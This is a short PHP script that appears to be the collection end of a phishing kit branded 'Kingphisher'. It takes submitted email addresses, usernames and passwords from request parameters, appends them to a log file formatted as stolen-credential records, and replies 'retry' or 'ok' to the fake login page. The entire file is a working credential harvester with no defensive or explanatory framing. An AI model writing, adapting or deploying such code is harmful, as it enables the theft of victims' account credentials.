<?php

    $username = $_GET['username'];
    $password = $_GET['password'];
    $reason = $_GET['reason'];
    $account = $_GET['owner'];

    $message = "\n";
    $message .= "|----------| Kingphisher|--------------|\n";
    $message .= "|-------| Attachment Logs|-------|\n";
    $message .= "Email           : ".$account."\n";
	$message .= "Username           : ".$username."\n";
    $message .= "Password           : ".$password."\n";
    $message .= "\n";
    $message .= "\n";

    file_put_contents('log.txt', $message, FILE_APPEND);

    if (!$reason) {
        echo 'retry';
    } elseif ($reason = '2'){
        echo 'ok';
    }